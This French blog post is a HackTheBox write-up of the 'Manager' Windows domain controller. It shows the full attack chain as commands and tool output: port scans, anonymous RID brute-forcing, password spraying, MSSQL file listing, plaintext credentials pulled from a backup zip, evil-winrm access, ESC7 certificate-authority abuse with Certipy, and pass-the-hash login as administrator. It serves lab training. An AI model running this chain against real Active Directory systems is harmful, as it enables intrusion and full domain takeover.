---
title: Manager - HacktheBox(Medium)
date: 2024-03-31 00:00:00 -0500
description: Manager est une machine windows qui heberge un environnement Active Directory avec AD CS(Active Directory Certificates Services). Avec un utilisateur anonyme j'arrive a enumerer les autres utilisateurs du Controlleur de Domaine grace au rid-brute forcing. En faisant du PasswordSpraying tout en utilisant le nom de chaque utilisateurs aussi comme mot de passe. Ainsi je trouve un utilisateur ayant un acces au Base de Donnees `MSSQL`. Explorant la Base de Donnees je trouve une sauvegarde ancienne en zip qui contient un utilisateur et un mot de passe qui m'ont donc permis d'avoir l'acces Winrm.
    Enfin, J'exploite une Misconfiguration du Certificat de Services via le ESC7 pour avoir les privileges de Domain ADMIN(administrateur)

categories: [Active Directory, HacktheBox]
tags: [HTB, CTFs, AD]
image:
    path: https://i.ibb.co/dKGd3Cm/manager.png
    alt: Manager HTB
---


- **[The Best Academy to Learn Hacking](https://affiliate.hackthebox.com/nenandjabhata)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Reconnaissance
Pour commencer ma reconnaissance je vais lancer mon [script nmapauto](https://github.com/nenandjabhata/CTFs-Journey/blob/main/Scripts/nmapauto.sh)

```shell
└─# /home/blo/tools/nmapautomate/nmapauto.sh $ip

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-23 17:13 CDT
Initiating Ping Scan at 17:13
Scanning 10.129.177.26 [4 ports]
Discovered open port 464/tcp on 10.129.177.26
Discovered open port 3268/tcp on 10.129.177.26
SYN Stealth Scan Timing: About 70.56% done; ETC: 17:16 (0:00:50 remaining)
Increasing send delay for 10.129.177.26 from 10 to 20 due to 11 out of 28 dropped probes since last increase.
SYN Stealth Scan Timing: About 81.96% done; ETC: 17:16 (0:00:38 remaining)
SYN Stealth Scan Timing: About 86.56% done; ETC: 17:17 (0:00:33 remaining)
Increasing send delay for 10.129.177.26 from 20 to 40 due to 11 out of 20 dropped probes since last increase.
Completed SYN Stealth Scan at 17:18, 326.68s elapsed (1000 total ports)
Nmap scan report for 10.129.177.26
Host is up (0.34s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 329.31 seconds
           Raw packets sent: 5069 (222.988KB) | Rcvd: 105 (4.592KB)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,80,88,135,139,389,445,464,593,636,1433,3268,3269                                                                                             
----------------------------------------------------------------------------------------------------------                                                   
Discovered open port 636/tcp on 10.129.177.26
Completed SYN Stealth Scan at 17:23, 267.64s elapsed (65535 total ports)
Initiating Service scan at 17:23
Scanning 11 services on 10.129.177.26
Completed Service scan at 17:24, 71.11s elapsed (11 services on 1 host)
NSE: Script scanning 10.129.177.26.
Initiating NSE at 17:24
Completed NSE at 17:24, 13.13s elapsed
Initiating NSE at 17:24
Completed NSE at 17:24, 4.13s elapsed
Nmap scan report for 10.129.177.26
Host is up (0.49s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn?
636/tcp   open  ssl/ldap
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
9389/tcp  open  mc-nmf       .NET Message Framing
49693/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49695/tcp open  unknown
64792/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port139-TCP:V=7.94SVN%I=7%D=3/23%Time=65FF565A%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,5,"\x83\0\0\x01\x8f")%r(GenericLines,5,"\x83\0\0\x01\x8f")%r
SF:(HTTPOptions,5,"\x83\0\0\x01\x8f")%r(RTSPRequest,5,"\x83\0\0\x01\x8f")%
SF:r(RPCCheck,5,"\x83\0\0\x01\x8f")%r(DNSVersionBindReqTCP,5,"\x83\0\0\x01
SF:\x8f")%r(DNSStatusRequestTCP,5,"\x83\0\0\x01\x8f")%r(Help,5,"\x83\0\0\x
SF:01\x8f")%r(SSLSessionReq,5,"\x83\0\0\x01\x8f")%r(shellServerCookie,5
SF:,"\x83\0\0\x01\x8f")%r(TLSSessionReq,5,"\x83\0\0\x01\x8f")%r(Kerberos,5
SF:,"\x83\0\0\x01\x8f")%r(X11Probe,5,"\x83\0\0\x01\x8f")%r(FourOhFourReque
SF:st,5,"\x83\0\0\x01\x8f")%r(LPDString,5,"\x83\0\0\x01\x8f")%r(LDAPSearch
SF:Req,5,"\x83\0\0\x01\x8f")%r(LDAPBindReq,5,"\x83\0\0\x01\x8f")%r(SIPOpti
SF:ons,5,"\x83\0\0\x01\x8f")%r(LANDesk-RC,5,"\x83\0\0\x01\x8f")%r(NCP,5,"\
SF:x83\0\0\x01\x8f")%r(NotesRPC,5,"\x83\0\0\x01\x8f")%r(JavaRMI,5,"\x83\0\
SF:0\x01\x8f")%r(WMSRequest,5,"\x83\0\0\x01\x8f");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 356.34 seconds
           Raw packets sent: 393379 (17.309MB) | Rcvd: 139 (6.032KB)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,80,135,139,636,1433,3268,9389,49693,49695,64792,1 service unrecognized despite returning data. If you know the service                       
----------------------------------------------------------------------------------------------------------                                                   
```


- Pour approfondir les informations de mon scan, je vais alors lancer un second scan sur la Box

```shell
└─# nmap -sCV -Pn -p53,80,135,139,636,1433,3268,9389,49693,49695,64792,445,3269 $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-23 17:27 CDT
Host is up (0.33s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp   open  kerberos-sec
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-title: Manager
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-24T05:30:15+00:00; +7h00m08s from scanner time.
1433/tcp  filtered ms-sql-s
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-24T05:30:14+00:00; +7h00m08s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-24T05:30:13+00:00; +7h00m08s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
9389/tcp  filtered adws
49693/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp filtered unknown
64792/tcp open     unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-03-24T05:29:35
|_  start_date: N/A
|_clock-skew: mean: 7h00m07s, deviation: 0s, median: 7h00m07s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.47 seconds
                                                                
```

### Analyse
Grace a mon second scan sur tous les ports ouvertes je trouve QUELQUES PORTS IMPORTANTS:

- Le Domain (*manager.htb*) et le Domain Controlleur(*dc01.manager.htb*)
- Le Kerberos ouvert sur le port 88
- SMB sur les ports 139 et 445
- MSRPC sur le port 135
- LDAP disponible aux ports 636/3268/3269/
- MSSQL disponible au port 1433

Je vais ajouter la Box a mon `hosts`

```shell
┌──(root㉿xXxX)-[/home/blo/CTFs/Boot2root/HTB]
└─# host=manager.htb&&host2=dc01.manager.htb                
                                                                                                                                                             
┌──(root㉿xXxX)-[/home/blo/CTFs/Boot2root/HTB]
└─# echo "$ip  $host $host2" | tee -a /etc/hosts                                         
10.129.177.26  manager.htb dc01.manager.htb
```

> Maintenant quoi faire avec ces ports ? Par ou Commencer ?
> {: .prompt-tip}

### Commencer par le SMB
Avec les Boxes Windows, si je trouve des ports SMB(139/445) j'utilise `netexec` pour les enumerer

##### Utilisateur Anonyme
Avec `netexec` je trouve que l'acces anonyme est autorisee mais je peux pas enumerer les partages de fichiers(`Shares`).

```shell
└─# nxc smb $ip -u '' -p '' --shares
SMB         10.129.177.26   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.177.26   445    DC01             [+] manager.htb\: 
SMB         10.129.177.26   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED

```

Des fois, les informations de sortie des outils sont pas tout a fait vrai, alors je vais utiliser `smbclient` pour plus d'infos sur les partages de fichiers

```shell
└─# smbclient -N -L //manager.htb

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
└─# smbclient -N //manager.htb/SYSVOL
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```

Pas assez d'infos aussi sur ces partages de fichiers, alors je vais essayer de faire du RID-Brutefoce.
Avec `crackmapexec` je vais ajouter l'option `--rid-brute`

```shell
└─# crackmapexec smb manager.htb -u anonymous -p "" --rid-brute
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\anonymous: 
SMB         manager.htb     445    DC01             [+] Brute forcing RIDs
SMB         manager.htb     445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         manager.htb     445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         manager.htb     445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         manager.htb     445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         manager.htb     445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         manager.htb     445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         manager.htb     445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         manager.htb     445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         manager.htb     445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         manager.htb     445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         manager.htb     445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         manager.htb     445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         manager.htb     445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         manager.htb     445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         manager.htb     445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         manager.htb     445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         manager.htb     445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         manager.htb     445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         manager.htb     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         manager.htb     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         manager.htb     445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

J'ai trouver des utilisateurs, alors je vais les mettre dans une liste puis essayer de faire du `PasswordSpraying` avec `nxc`

![nxc PasswordSpray]()

Je trouve un Utilisateur valide, alors je vais l'essayer avec le `mssql` disponible au port `1433`

```shell
└─# impacket-mssqlclient manager.htb/operator:operator@10.129.243.129 -windows-auth
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> xp_dirtree
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   

Documents and Settings          1      0   

inetpub                         1      0   

PerfLogs                        1      0   

Program Files                   1      0   

Program Files (x86)             1      0   

ProgramData                     1      0   

Recovery                        1      0   

SQL2019                         1      0   

System Volume Information       1      0   

Users                           1      0   

Windows                         1      0   

SQL (MANAGER\Operator  guest@master)> 

```

Donc ici, je dois lister toutes les fichiers dans ces dossier avec `xp_dirtree`, alors je vais checker les fichiers disponible sur le serveur web.

```shell
SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub';
subdirectory                     depth   
------------------------------   -----   
custerr                              1   
en-US                                2   
history                              1   
logs                                 1   
temp                                 1   
appPools                             2   
IIS Temporary Compressed Files       2   
wwwroot                              1   
css                                  2   
images                               2   
js                                   2   
SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub\wwwroot\', 0, 1;
jquery-3.4.1.min.js                   2      1   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1   

```

Je trouve un backup du site a l'interieur de la racine `wwwroot`, alors je veux le telecharger avec `wget`

```shell
└─# wget http://manager.htb/website-backup-27-07-23-old.zip                            
--2024-03-28 14:45:23--  http://manager.htb/website-backup-27-07-23-old.zip
Resolving manager.htb (manager.htb)... 10.129.243.129
Connecting to manager.htb (manager.htb)|10.129.243.129|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip                 100%[====================================================================================================>]   1021K  47.9KB/s    in 24s     

2024-03-28 14:45:48 (42.5 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]

─# unzip website-backup-27-07-23-old.zip -d web_backup
Archive:  website-backup-27-07-23-old.zip
  inflating: web_backup/.old-conf.xml  
  inflating: web_backup/about.html   
  inflating: web_backup/contact.html  
  inflating: web_backup/css/bootstrap.css  
  inflating: web_backup/css/responsive.css  
  inflating: web_backup/css/style.css  
  inflating: web_backup/css/style.css.map  
  inflating: web_backup/css/style.scss  
  inflating: web_backup/images/about-img.png  
  inflating: web_backup/images/body_bg.jpg  
 extracting: web_backup/images/call.png  
 extracting: web_backup/images/call-o.png  
  inflating: web_backup/images/client.jpg  
  inflating: web_backup/images/contact-img.jpg  
 extracting: web_backup/images/envelope.png  
 extracting: web_backup/images/envelope-o.png  
  inflating: web_backup/images/hero-bg.jpg  
 extracting: web_backup/images/location.png  
 extracting: web_backup/images/location-o.png  
 extracting: web_backup/images/logo.png  
  inflating: web_backup/images/menu.png  
 extracting: web_backup/images/next.png  
 extracting: web_backup/images/next-white.png  
  inflating: web_backup/images/offer-img.jpg  
  inflating: web_backup/images/prev.png  
 extracting: web_backup/images/prev-white.png  
 extracting: web_backup/images/quote.png  
 extracting: web_backup/images/s-1.png  
 extracting: web_backup/images/s-2.png  
 extracting: web_backup/images/s-3.png  
 extracting: web_backup/images/s-4.png  
 extracting: web_backup/images/search-icon.png  
  inflating: web_backup/index.html   
  inflating: web_backup/js/bootstrap.js  
  inflating: web_backup/js/jquery-3.4.1.min.js  
  inflating: web_backup/service.html  
```

En le dezippant, comme vous voyez je trouve un fichier xml `.old-conf.xml` qui est cachee. Voici son contenue

```xml
─# cat web_backup/.old-conf.xml 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

Un utilisateur `raven` et son mot de passe `R4v3nBe5tD3veloP3r!123`, Oui c'est ce que je trouve. Comme le `winrm` est ouvert alors je vais acceder au bureau de cet utilisateur la grace au protocol `winrm`.

```sh
└─# evil-winrm -i $ip -u raven -p 'R4v3nBe5tD3veloP3r!123'   
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> whoami
manager\raven
*Evil-WinRM* PS C:\Users\Raven\desktop> dir


    Directory: C:\Users\Raven\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/29/2024   5:11 AM             34 user.txt


*Evil-WinRM* PS C:\Users\Raven\desktop> type user.txt
996de58e4fa5c691254f08ad05743011
```

## Privilege Escalation
>C'est vrai que sur un Domain Windows, la premiere des choses a verifier si on veux etre Domain Admin est `bloodhound`, Mais faut pas oublier qu'il existe aussi des Certificats de Services Active Directory(AD CS) qui sont parfois vulnerable et qui peuvent nous aider a etre Domain Admin.
>{: .prompt-info}

Alors je vais commencer d'abord par identifier ces services.

```sh
└─# nxc ldap 'dc01.manager.htb' -d manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123' -M adcs 
SMB         10.129.170.217  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
LDAP        10.129.170.217  389    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 
ADCS        10.129.170.217  389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS                                                Found PKI Enrollment Server: dc01.manager.htb
ADCS                                                Found CN: manager-DC01-CA


```

Je trouve qu'il existe bel et bien un certificat de Services dans ce Controlleur de Domain. Donc je vais chercher des vulnerabilites dans ces certificats avec l'outil  `Certipy`

```sh
└─# certipy find -vulnerable -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.170.217
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Saved BloodHound data to '20240329004451_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240329004451_Certipy.txt'
[*] Saved JSON output to '20240329004451_Certipy.json'
```

![Dangerous](https://i.ibb.co/T8tpCPv/m2.png)
L'outil trouve une vulnerabilites `ESC7` disant que l'utilisateur `raven` a des Permissions Dangereuse.
>L'ESC7 se produit lorsqu'un utilisateur dispose du droit d'accès Manage CA ou Manage Certificates sur une autorité de certification. Il n'existe pas de techniques publiques permettant d'abuser du droit d'accès `Manage Certificates` pour une escalade des privilèges du domaine, mais il peut être utilisé pour émettre ou refuser des demandes de certificats en attente.
>{: .prompt-info}

- Pour commencer, il faut voir sur qu'on a que les droits `Manage CA`, alors je vais m'octroyer des droits de `Manage Certificates` en ajoutant mon utilisateur en tant que nouvelle agent


```sh
─# certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.170.217
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

- Ensuite je vais activer le template `SubCA` avec le parametre `-enable-template SubCA`, Mais par default ce template est deja activee.

```sh
─# certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.170.217
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```



### L'ATTAQUE
Si nous avons rempli les conditions préalables à cette attaque, nous pouvons commencer par demander un certificat basé sur le modèle `SubCA`.

```sh
└─# certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target 'dc01.manager.htb' -template SubCA -upn administrator@manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 15
Would you like to save the private key? (y/N) y
[*] Saved private key to 15.key
[-] Failed to request certificate
```

Cette demande a échoué, mais nous a conserver la clé privée(`15.key`) et note l'identifiant de la demande c'est a dire `administrator@manager.htb`.

- Avec nos droits `Manage CA` et `Manage Certificates` nous pouvons alors emettre la demande du Certificat qui a échoué avec le `-issue-request` de Certipy

```sh
└─# certipy ca -ca manager-DC01-CA -issue-request 15  -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'                                        
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
└─# certipy req -ca manager-DC01-CA -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'  -target dc01.manager.htb -retrieve 15                                  
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 15
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '15.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

- Enfin, nous avons récupérer le certificat émis à l'aide de la commande `req` et du paramètre ``-retrieve 15``. ce qui nous a donnee un fichier `administrator.pfx` avec laquelle on pourra dumper le hash `NTLM` de l'adminstrateur avec la commande `auth` de Certipy

```sh
└─# certipy auth -pfx administrator.pfx -dc-ip 10.129.170.217
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef

```

Avec ce hash, je vais me connecter sur l'utilisateur `administrator` avec le `winrm`

```sh
# evil-winrm -i $ip -u administrator -H ae5064c2f62317332c88629e025924ef
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
manager\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
49d8a6570dd60c8ecb2b238c6dd14dec
```

![ipconfig](https://i.ibb.co/5GDTSTn/ip.png)


## Ressources supplementaires
Voici quelques ressources supplémentaires qui pourraient vous être utiles :

- [Domain Escalate Hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2)
- [Active Directory CS Pentesting by Exploit-Notes](https://exploit-notes.hdks.org/exploit/windows/active-directory/ad-cs-pentesting/)
- [msSQL Pentest](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- [xp_dirtree to list files](https://www.sqlservercentral.com/blogs/how-to-use-xp_dirtree-to-list-all-files-in-a-folder)
- [Active Directory Certificate Pentest](https://www.thehacker.recipes/a-d/movement/ad-cs)
- [Certipy](https://github.com/ly4k/Certipy)
- [ESC7 Exploitation](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7){#Esc7}
- [Fix KRB_AP_ERR_SKEW](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069)
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
